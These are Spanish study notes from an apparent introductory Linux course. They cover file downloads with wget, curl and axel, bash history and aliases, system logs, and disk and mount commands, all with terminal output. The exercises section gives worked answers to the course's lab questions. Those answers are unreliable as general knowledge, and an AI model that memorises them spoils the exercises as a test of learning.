+<h3 id="7-downloading-files">7. Downloading Files.</h3>
+
+<p>Vamos a ver diversas herramientas sobre cómo descargar ficheros.</p>
+
+<p><br /></p>
+
+<h4 id="71-wget">7.1. wget.</h4>
+
+<p>Wget es un comando que emplea los protocolos HTTP/S y FTP para descargar ficheros. Es frecuente emplearlo junto con el operador -O para designar un fichero de destino.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>wget <span class="nt">-O</span> report_wget.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
+<span class="nt">--2018-01-28</span> 20:30:04--  https://www.offensive-security.com/reports/penetration-testin
+Resolving www.offensive-security.com <span class="o">(</span>www.offensive-security.com<span class="o">)</span>... 192.124.249.5
+Connecting to www.offensive-security.com <span class="o">(</span>www.offensive-security.com<span class="o">)</span>|192.124.249.5|:4
+HTTP request sent, awaiting response... 200 OK
+Length: 27691955 <span class="o">(</span>26M<span class="o">)</span> <span class="o">[</span>application/pdf]
+Saving to: ‘report_wget.pdf’
+
+report_wget.pdf     100%[<span class="o">===================&gt;]</span>  26.41M   766KB/s    <span class="k">in </span>28s     
+
+2018-01-28 20:30:33 <span class="o">(</span>964 KB/s<span class="o">)</span> - ‘report_wget.pdf’ saved <span class="o">[</span>27691955/27691955]
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="72-curl">7.2. Curl</h4>
+
+<p>Curl es una herramienta que tiene el mismo propósito que wget pero es más flexible pues admite un conjunto de modificaciones y protocolos más amplio.</p>
+
+<p>Un usuario puede emplear esta herramienta para descargar un fichero o crear requests complejas en los protocolos IMAP/S, POP3/S, SCP, SFTP, SMB/S, TELNET, TFTP entre otros.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>curl <span class="nt">-o</span> report.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 26.4M  100 26.4M    0     0  1590k      0  0:00:17  0:00:17 <span class="nt">--</span>:--:--  870k
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="73-axel">7.3. Axel.</h4>
+
+<p>Esta es una herramienta que permite la elaboración de peticiones complejas a través de múltiples conexiones en los protocolos FTP y HTTP. El parámetro que define cuántas conexiones establecer es ‘-n’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>axel <span class="nt">-a</span> <span class="nt">-n</span> 20 <span class="nt">-o</span> report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
+Initializing download: https://www.offensive-security.com/reports/penetration-testing-
+File size: 27691955 bytes
+Opening output file report_axel.pdf
+Starting download
+
+Connection 0 finished
+Connection 1 finished
+Connection 2 finished
+Connection 3 finished
+Connection 4 finished
+Connection 5 finished
+Connection 6 finished
+Connection 7 finished
+Connection 8 finished
+Connection 9 finished
+Connection 10 finished
+Connection 11 finished
+Connection 13 finished
+Connection 14 finished
+Connection 15 finished
+Connection 16 finished
+Connection 18 finished
+<span class="o">[</span>100%] <span class="o">[</span>...................................................................................................................................................................] <span class="o">[</span>  11.1MB/s] <span class="o">[</span>00:00]
+
+Downloaded 26.4 Megabyte <span class="k">in </span>2 seconds. <span class="o">(</span>11380.17 KB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="74-practice---downloading-files">7.4. Practice - Downloading Files.</h4>
+
+<p><strong>1erFlag</strong></p>
+
+<p>En este caso tenemos una máquina que está hosteando un servidor web en el puerto 80. Accedemos a el mediante Curl y obtenemos la flag.</p>
+
+<p><br /></p>
+
+<h3 id="8-personalizando-el-entorno-de-bash">8. Personalizando el entorno de Bash.</h3>
+
+<p>Vamos a ver distintas formas de personalizar el entorno de trabajo.</p>
+
+<p><br /></p>
+
+<h4 id="81-bash-history-customization">8.1. Bash History Customization.</h4>
+
+<p>Tenemos tres variables de entorno importantes: HISTCONTROL, HISTIGNORE, HISTTIMEFORMAT.</p>
+
+<p>HISTCONTROL es una varibale que define si se eliminan comandos duplicados entre otras cosas. HISTIGNORE es una variable que ignora en el historial comandos que se repiten con frecuencia como ls, history, etc:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ export HISTIGNORE="&amp;:ls:[bf]g:exit:history"
+
+kali@kali:~$ mkdir test
+
+kali@kali:~$ cd test
+
+kali@kali:~/test$ ls
+
+kali@kali:~/test$ pwd
+/home/kali/test
+
+kali@kali:~/test$ ls
+
+kali@kali:~/test$ history
+    1  export HISTIGNORE="&amp;:ls:[bf]g:exit:history"
+    2  mkdir test
+    3  cd test
+    4  pwd
+</code></pre></div></div>
+
+<p>En el ejemplo anterior se puede ver cómo en el historial no aparecen ciertos comandos especificados que tienen poca relevancia.</p>
+
+<p>Por último HISTTIMEFORMAT controla el formato de salida del comando ‘history’</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/test<span class="nv">$ </span><span class="nb">export </span><span class="nv">HISTTIMEFORMAT</span><span class="o">=</span><span class="s1">'%F %T '</span>
+
+kali@kali:~/test<span class="nv">$ </span><span class="nb">history
+    </span>1  2018-02-12 13:37:33 <span class="nb">export </span><span class="nv">HISTIGNORE</span><span class="o">=</span><span class="s2">"&amp;:ls:[bf]g:exit:history"</span>
+    2  2018-02-12 13:37:38 <span class="nb">mkdir test
+    </span>3  2018-02-12 13:37:40 <span class="nb">cd test
+    </span>4  2018-02-12 13:37:43 <span class="nb">pwd
+    </span>5  2018-02-12 13:37:51 <span class="nb">export </span><span class="nv">HISTTIMEFORMAT</span><span class="o">=</span><span class="s1">'%F %T '</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="82-alias">8.2. Alias.</h4>
+
+<p>Un ‘alias’ esencialmente consiste en un string, una cadena de caracteres, que reemplaza una línea de comando. Especialmente útiles para guardar comandos largos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">alias </span><span class="nv">lsa</span><span class="o">=</span><span class="s1">'ls -la'</span>
+
+kali@kali:~<span class="nv">$ </span>lsa
+total 8308
+
+........
+<span class="nt">-rw-------</span>  1 kali kali     5542 Jan 22 09:56 .bash_history
+<span class="nt">-rw-r--r--</span>  1 kali kali     3391 Apr 25  2017 .bashrc
+drwx------  9 kali kali     4096 Oct  2 21:29 .cache
+</code></pre></div></div>
+
+<p>Un aspecto de los alias con los que tenemos que tener cuidado es con el hecho de que no hay restricciones en los nombres y podemos terminar reemplazando el nombre de otro comando importante:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">alias mkdir</span><span class="o">=</span><span class="s1">'ping -c 1 localhost'</span>
+
+kali@kali:~<span class="nv">$ </span><span class="nb">mkdir
+</span>PING localhost<span class="o">(</span>localhost <span class="o">(</span>::1<span class="o">))</span> 56 data bytes
+64 bytes from localhost <span class="o">(</span>::1<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.121 ms
+
+<span class="nt">---</span> localhost ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 0.121/0.121/0.121/0.000 ms
+</code></pre></div></div>
+
+<p>Es importante notar que el ‘alias’ es propio de la sesión de bash y no la sobrevive, en el momento en el que reiniciemos la sesión los alias definidos quedarán borrados. Es decir, son temporales.</p>
+
+<p>Para deshacer un alias tenemos el término unalias:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">unalias mkdir
+
+</span>kali@kali:~<span class="nv">$ </span><span class="nb">mkdir
+mkdir</span>: missing operand
+Try <span class="s1">'mkdir --help'</span> <span class="k">for </span>more information.
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="83-persistent-bash-customization">8.3. Persistent Bash Customization.</h4>
+
+<p>Un fichero importante para la customización permanente de nuestro entorno de trabajo es el fichero “.bashrc” accesible desde nuestra carpeta personal. Este es un script que se ejecuta cada vez que el usuario se logea y que contiene configuración a modo de instrucciones en shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">cat</span> ~/.bashrc
+<span class="c"># ~/.bashrc: executed by bash(1) for non-login shells.</span>
+<span class="c"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span>
+<span class="c"># for examples</span>
+...
+<span class="c"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span>
+<span class="nv">HISTSIZE</span><span class="o">=</span>1000
+<span class="nv">HISTFILESIZE</span><span class="o">=</span>2000
+
+<span class="c"># enable color support of ls and also add handy aliases</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-x</span> /usr/bin/dircolors <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">test</span> <span class="nt">-r</span> ~/.dircolors <span class="o">&amp;&amp;</span> <span class="nb">eval</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">dircolors</span> <span class="nt">-b</span> ~/.dircolors<span class="si">)</span><span class="s2">"</span> <span class="o">||</span> <span class="nb">eval</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">dircolors</span> -
+    <span class="nb">alias ls</span><span class="o">=</span><span class="s1">'ls --color=auto'</span>
+</code></pre></div></div>
+
+<p>Como definición de variables o alias. De esta forma, cualquier variable o alias que se introduzca a modo de línea en este fichero se volverá un cambio permanente.</p>
+
+<p><br /></p>
+
+<h3 id="9-logs">9. Logs.</h3>
+<h4 id="91-introducción">9.1. Introducción</h4>
+
+<p>Los ‘logs’ o registros son ficheros que proveen una lista de eventos ocurridos en el sistema ordenados de forma cronológica. Estos ficheros son útiles desde una perspectiva administrativa para registrar fallos y desde una perspectiva de la ciberseguridad ya que, a no ser que estos sean borrados, registrarán los movimientos de unos atacantes pudiendo estos ser trackeados en un análisis forense.</p>
+
+<p>En linux, estos logs se guardan en el fichero /var/log.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/log
+total 2544
+<span class="nt">-rw-r--r--</span>  1 root  root     2911 Jul  7 08:33 alternatives.log
+drwxr-x---  2 root  adm      4096 Jun 23 15:04 apache2
+drwxr-xr-x  2 root  root     4096 Jul  7 08:31 apt
+<span class="nt">-rw-r-----</span>  1 root  adm      5444 Jul  7 13:39 auth.log
+<span class="nt">-rw-------</span>  1 root  root        0 Jun 25 14:39 boot.log
+<span class="nt">-rw-rw----</span>  1 root  utmp        0 Jul  7 08:25 btmp
+<span class="nt">-rw-r-----</span>  1 root  adm     41195 Jul  7 13:39 daemon.log
+<span class="nt">-rw-r-----</span>  1 root  adm      1157 Jul  7 08:40 debug
+<span class="nt">-rw-r--r--</span>  1 root  root   156531 Jul  7 08:34 dpkg.log
+<span class="nt">-rw-r--r--</span>  1 root  root    32032 Jun 23 15:07 faillog
+<span class="nt">-rw-r--r--</span>  1 root  root     5692 Jun 23 15:05 fontconfig.log
+...
+</code></pre></div></div>
+
+<p>Muchos de estos ficheros no tienen formato y se peden leer con cualquier herramienta que muestre el contenido de un archivo (cat, tail/head, vim, etc).</p>
+
+<p>Por otra parte, como estos archivos contienen información sensible está protegidos de forma que sólo alguien con permisos de superusuario puede manipularlos y por tanto requeriremos de ‘sudo’ para acceder a muchos de ellos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">sudo tail</span> <span class="nt">-3</span> /var/log/auth.log
+Jul  7 14:01:38 kali <span class="nb">sudo</span>: pam_unix<span class="o">(</span><span class="nb">sudo</span>:session<span class="o">)</span>: session closed <span class="k">for </span>user roo
+Jul  7 14:01:48 kali <span class="nb">sudo</span>:    kali : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/kali <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/tail <span class="nt">-3</span> /var/log/auth.log
+Jul  7 14:01:48 kali <span class="nb">sudo</span>: pam_unix<span class="o">(</span><span class="nb">sudo</span>:session<span class="o">)</span>: session opened <span class="k">for </span>user root<span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">)</span> by <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Aunque no todos los ficheros tienen una estructura lineal como esta sino otro tipo de estructuras. Por ejemplo, el fichero /var/log/wtmp tiene una estrucutra de tabla y necesita abrirse con ‘who’ o ‘last’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">who</span> /var/log/wtmp | <span class="nb">tail</span> <span class="nt">-5</span> 
+robert   tty7         2021-07-03 09:46 <span class="o">(</span>:0<span class="o">)</span>
+nichole  tty7         2021-07-03 11:53 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2021-07-06 08:04 <span class="o">(</span>:0<span class="o">)</span>
+robert   tty7         2021-07-06 15:09 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2021-07-07 14:03 <span class="o">(</span>:0<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Este registro muestra varios usuarios, incluido nuestro usuario <em>kali</em>, iniciando sesión en la máquina durante varios días.</p>
+
+<p>Además de los registros que ya hemos revisado, también podemos encontrar registros para otros tipos de eventos. Por ejemplo, el kernel emite mensajes que almacena en un ring buffer cada vez que sucede algo interesante (como la inserción de un nuevo dispositivo USB, una operación fallida del disco duro o la detección inicial de hardware en el arranque). Podemos recuperar los registros del kernel con el comando <em>dmesg</em> .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/etc# dmesg | <span class="nb">head</span>
+<span class="o">[</span>    0.000000] Linux version 5.4.0-42-generic <span class="o">(</span>buildd@lgw01-amd64-038<span class="o">)</span> <span class="o">(</span>gcc version 9.3.0 <span class="o">(</span>Ubuntu 9.3.0-10ubuntu2<span class="o">))</span> <span class="c">#46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 (Ubuntu 5.4.0-42.46-generic 5.4.44)</span>
+<span class="o">[</span>    0.000000] Command line: <span class="nv">BOOT_IMAGE</span><span class="o">=</span>/vmlinuz-5.4.0-42-generic <span class="nv">root</span><span class="o">=</span>/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable<span class="o">=</span>1 maybe-ubiquity
+<span class="o">[</span>    0.000000] KERNEL supported cpus:
+<span class="o">[</span>    0.000000]   Intel GenuineIntel
+<span class="o">[</span>    0.000000]   AMD AuthenticAMD
+<span class="o">[</span>    0.000000]   Hygon HygonGenuine
+<span class="o">[</span>    0.000000]   Centaur CentaurHauls
+<span class="o">[</span>    0.000000]   zhaoxin   Shanghai  
+<span class="o">[</span>    0.000000] x86/fpu: Supporting XSAVE feature 0x001: <span class="s1">'x87 floating point registers'</span>
+<span class="o">[</span>    0.000000] x86/fpu: Supporting XSAVE feature 0x002: <span class="s1">'SSE registers'</span>
+</code></pre></div></div>
+
+<p>Por último, <em>systemd</em> también almacena varios registros (salida de stdout/stderr de servicios, mensajes de syslog, registros de kernel) y facilita su consulta con <em>journalctl</em> .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/etc# journalctl | <span class="nb">head</span>
+<span class="nt">--</span> Logs begin at Wed 2021-08-04 12:29:09 UTC, end at Mon 2023-01-02 13:33:10 UTC. <span class="nt">--</span>
+Aug 04 12:29:09 linux04 kernel: Linux version 5.4.0-42-generic <span class="o">(</span>buildd@lgw01-amd64-038<span class="o">)</span> <span class="o">(</span>gcc version 9.3.0 <span class="o">(</span>Ubuntu 9.3.0-10ubuntu2<span class="o">))</span> <span class="c">#46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 (Ubuntu 5.4.0-42.46-generic 5.4.44)</span>
+Aug 04 12:29:09 linux04 kernel: Command line: <span class="nv">BOOT_IMAGE</span><span class="o">=</span>/vmlinuz-5.4.0-42-generic <span class="nv">root</span><span class="o">=</span>/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable<span class="o">=</span>1 maybe-ubiquity
+Aug 04 12:29:09 linux04 kernel: KERNEL supported cpus:
+Aug 04 12:29:09 linux04 kernel:   Intel GenuineIntel
+Aug 04 12:29:09 linux04 kernel:   AMD AuthenticAMD
+Aug 04 12:29:09 linux04 kernel:   Hygon HygonGenuine
+Aug 04 12:29:09 linux04 kernel:   Centaur CentaurHauls
+Aug 04 12:29:09 linux04 kernel:   zhaoxin   Shanghai  
+Aug 04 12:29:09 linux04 kernel: Disabled fast string operations
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Sin ningún argumento, journalctl volcará todos los registros disponibles cronológicamente. </p>
+  </li>
+  <li>
+    <p>Con la opción -r, invertirá el orden para que los mensajes más nuevos se muestren primero. </p>
+  </li>
+  <li>
+    <p>Con la opción -f, journalctl imprimirá continuamente nuevas entradas de registro a medida que se agregan a su base de datos. </p>
+  </li>
+  <li>
+    <p>Finalmente, la opción -u puede limitar los mensajes a aquellos emitidos por una unidad systemd específica. Por ejemplo, podríamos volcar los registros disponibles pertenecientes a ssh.service con journalctl -u ssh.service .</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Exercises</strong></p>
+
+<p><strong>¿Cuál es el usuario que se ha logeado antes que nosostros?</strong></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Acudimos al registro /var/log/wtmp que muestra los usuarios logeados en el sistema y seguidamente ejecutamos el comando ‘who /var/log/wtmp</td>
+      <td>tail -2’ para obtener el nuestro y el inmediatamente superior.</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:~# <span class="nb">who</span> /var/log/wtmp | <span class="nb">tail</span> <span class="nt">-2</span>
+chuck    tty1         2021-08-04 12:29
+root     pts/0        2023-01-02 16:46 <span class="o">(</span>192.168.49.57<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Observamos que como nuestra conexión es a través de SSH se indica la IP source.</p>
+
+<p><br /></p>
+
+<p><strong>¿Cuál es la dirección IP de la conexión remota en el fichero proporcionado wtmp.exercise file?</strong></p>
+
+<p>Lo abrimos con el comando ‘who’ y obtenemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">who</span> /home/kali/Desktop/d34b9deb18990e8c1347579a4b0d44e3-wmtp.exercise 
+kali     tty7         2020-07-27 13:28 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2020-07-27 13:31 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2020-07-27 13:36 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2021-02-18 20:31 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2021-02-22 08:10 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2021-02-24 08:33 <span class="o">(</span>:0<span class="o">)</span>
+kali     tty7         2021-02-24 08:37 <span class="o">(</span>:0<span class="o">)</span>
+kali     pts/1        2021-03-09 18:43 <span class="o">(</span>192.168.49.134<span class="o">)</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>¿Qué run level tiene actualmente el sistema?</strong></p>
+
+<p>Los ‘running levels’ son estados en los que el sistema operativo corre de acuerdo a las necesidades del sistema. Las distintas posibilidades son:</p>
+
+<ul>
+  <li><strong>0</strong> - Hal</li>
+  <li><strong>1</strong> - Single-user text mode</li>
+  <li><strong>2</strong> - Not used (user-definable)</li>
+  <li><strong>3</strong> - Full multi-user text mode</li>
+  <li><strong>4</strong> - Not used (user-definable)</li>
+  <li><strong>5</strong> - Full multi-user graphical mode (with an X-based login screen)</li>
+  <li><strong>6</strong> - Reboo</li>
+</ul>
+
+<p>Y podemos obtener el nivel actual a través del comando ‘runlevel’.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:~# runlevel
+N 5
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>¿Qué usuarios están activos actualmente?</strong></p>
+
+<p>Podemos listar aquellos usuarios que están actualmente activos mediante el comando ‘w’ o el comando ‘who’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:~# <span class="nb">who
+</span>root     pts/0        2023-01-02 16:46 <span class="o">(</span>192.168.49.57<span class="o">)</span>
+root@linux04:~# w
+ 17:22:41 up 40 min,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/0    192.168.49.57    16:46    1.00s  0.03s  0.01s w
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Apache normalmente está capacitada para escribir en varios archivos registros pero actualmente está configurado para escribir sólo en uno. ¿Cuál es?</strong></p>
+
+<p>Acudimos a /var/log y lo listamos recursivamente y filtramos por el término apache:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/var/log# <span class="nb">ls</span> <span class="nt">-lR</span> | <span class="nb">grep </span>apache
+drwxr-x---  2 root      adm               4096 Jan  2 16:44 apache2
+./apache2:
+<span class="nt">-rw-r-----</span> 1 root adm   0 Jan  2 16:44 apache-custom.log
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Un comando invalido está generando un error en el inicio del servicio Apache2 ¿Cuál?</strong></p>
+
+<p>En primer lugar intentamos iniciar el servicio Apache2:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/etc/apache2# systemctl start apache2
+Job <span class="k">for </span>apache2.service failed because the control process exited with error code.
+See <span class="s2">"systemctl status apache2.service"</span> and <span class="s2">"journalctl -xe"</span> <span class="k">for </span>details.
+</code></pre></div></div>
+
+<p>De esta forma, ejecutamos ‘journalctl -xe’ y revisando los mensajes de error obtenemos el siguiente mensaje:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Jan 02 17:48:00 linux04 apachectl[3379]: AH00526: Syntax error on line 228 of /etc/apache2/apache2.conf:
+</code></pre></div></div>
+
+<p>Así, extraemos esta linea y obtenemos que el comando que está generando el error:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/etc/apache2# <span class="nb">cat</span> <span class="nt">-n</span> /etc/apache2/apache2.conf | <span class="nb">grep </span>228
+228	IncorrectDirective <span class="nb">true</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="10-disk-management">10. Disk Management.</h3>
+
+<h4 id="101-espacio-de-memoria-particiones-y-dispositivos-externos">10.1. Espacio de memoria, Particiones y Dispositivos Externos.</h4>
+
+<p>En esta sección vamos a ver herramientas y utilidades para interaccionar con el disco y memoria del sistema en Linux.</p>
+
+<p>Las utilidades que aquí presentamos son: free, dd, du, df and mount.</p>
+
+<ul>
+  <li>El comando <em>free</em> despliega información sobre la memoria, además están añadidas las opciones ‘-m’ y ‘-g’ para desplegar información en distintas unidades de bytes:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kal@kali:~<span class="nv">$ </span>free <span class="nt">-m</span>
+          total     used      free    shared  buff/cache   available
+Mem:       1982      425       269         3        1287        1369
+Swap:       974       15       959
+</code></pre></div></div>
+
+<ul>
+  <li>El comando ‘df’ es un acrónimo ‘disk free’ e informa sobre el espacio de disco disponible en cada uno de los discos montados en el sistema de archivos. Su opción -h (para lectura humana) convierte los tamaños en una unidad más legible, generalmente mebibytes o gibibytes:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">df</span> <span class="nt">-h</span>
+Filesystem      Size  Used Avail Use% Mounted on
+udev            958M     0  958M   0% /dev
+tmpfs           199M  1.2M  198M   1% /run
+/dev/sda1        19G   10G  7.7G  57% /
+tmpfs           992M  8.0K  992M   1% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           199M   68K  199M   1% /run/user/1000
+</code></pre></div></div>
+
+<p>Hay algunos otros comandos y opciones que también podemos usar.</p>
+
+<ul>
+  <li>
+    <p><em>dd</em> se usa principalmente para copiar sin procesar un archivo de dispositivo en un nivel de bloque.</p>
+  </li>
+  <li>
+    <p><em>du</em> se puede utilizar para determinar el tamaño de archivos y directorios. La opción <em>-hs</em> generalmente se usa para hacer que la salida sea más legible para los humanos.</p>
+  </li>
+  <li>
+    <p><em>df</em> y su opción <em>-T</em> se pueden usar para mostrar el tipo de sistema de archivos.</p>
+  </li>
+</ul>
+
+<p>Una de las diferencias clave entre Linux y otros sistemas operativos es que en Linux tenemos que <em>montar</em> un sistema de archivos antes de poder usarlo (Montar consiste en volver accesible los contenidos de un dispositivo a través del sistema de ficheros). </p>
+
+<p>Dado que los sistemas Linux tienen un solo árbol de directorios, si tuviéramos que insertar una unidad USB (por ejemplo), tendríamos que crear una ubicación asociada en algún lugar de ese árbol. La creación de esa ubicación asociada se denomina <em>montaje</em> .</p>
+
+<p>El comando <em>mount</em> se puede usar para mostrar los sistemas de archivos montados actualmente y sus tipos. También se puede usar para montar particiones o archivos de disco de imagen en un punto de montaje.</p>
+
+<p>Ejecutemos el comando de montaje con la opción -t para mostrar un determinado tipo de sistema de archivos montado. En este caso, mostraremos las particiones formateadas como ext4, que es el sistema de archivos para esta máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>mount <span class="nt">-t</span> ext4
+/dev/sda1 on / <span class="nb">type </span>ext4 <span class="o">(</span>rw,relatime,errors<span class="o">=</span>remount-ro<span class="o">)</span>
+kali@kali:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Así por ejemplo, si insertarámos un USB en el sistema, primero querríamos tener información sobre el mismo, para lo cual utilizaríamos la utilidad ‘fdisk’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">sudo </span>fdisk <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+
+Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
+Disk model: VMware Virtual S
+Units: sectors of 1 <span class="k">*</span> 512 <span class="o">=</span> 512 bytes
+Sector size <span class="o">(</span>logical/physical<span class="o">)</span>: 512 bytes / 512 bytes
+I/O size <span class="o">(</span>minimum/optimal<span class="o">)</span>: 512 bytes / 512 bytes
+Disklabel <span class="nb">type</span>: dos
+Disk identifier: 0xb31f280c
+
+Device     Boot    Start      End  Sectors  Size Id Type
+/dev/sda1  <span class="k">*</span>        2048 39942143 39940096   19G 83 Linux
+/dev/sda2       39944190 41940991  1996802  975M  5 Extended
+/dev/sda5       39944192 41940991  1996800  975M 82 Linux swap / Solaris
+
+Disk /dev/sdb: 980 MiB, 1027604480 bytes, 2007040 sectors
+Disk model: TD Classic 003C 
+Units: sectors of 1 <span class="k">*</span> 512 <span class="o">=</span> 512 bytes
+Sector size <span class="o">(</span>logical/physical<span class="o">)</span>: 512 bytes / 512 bytes
+I/O size <span class="o">(</span>minimum/optimal<span class="o">)</span>: 512 bytes / 512 bytes
+Disklabel <span class="nb">type</span>: dos
+Disk identifier: 0x5381b121
+
+Device     Boot Start     End Sectors  Size Id Type
+/dev/sdb1  <span class="k">*</span>       32 2007039 2007008  980M  b W95 FAT32
+</code></pre></div></div>
+
+<p>La primera parte de la salida, con 20 GiB de memoria, es nuestra máquina local. También observamos otro disco listado aquí con 980 MiB de memoria. Esta es nuestra unidad USB. También anotaremos la ubicación del dispositivo, que es /dev/sdb1. Esto será útil más adelante.</p>
+
+<p>Ahora para montar el dispositivo con la finalidad de acceder a sus contenidos. En primer lugar, creamos un punto de montaje eligiendo un directorio (existente o creado). Es común usar el directorio /mnt ya existente para esto, así que crearemos un subdirectorio llamado /usb . A continuación, ejecutaremos el comando <em>mount</em> y proporcionaremos la ubicación del dispositivo, así como la ubicación del punto de montaje. Podemos obtener la ubicación del dispositivo, /dev/sdb1 del comando anterior:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">sudo mkdir</span> /mnt/usb
+
+kali@kali:~<span class="nv">$ </span><span class="nb">sudo </span>mount /dev/sdb1 /mnt/usb
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cd</span> /mnt/usb
+
+kali@kali:/mnt/usb<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 2100
+drwxr-xr-x 3 root root   4096 Dec 31  1969 <span class="nb">.</span>
+drwxr-xr-x 3 root root   4096 Jul  8 11:12 ..
+<span class="nt">-rwxr-xr-x</span> 1 root root 817959 Feb 16 10:45 IMG_3396.jpg
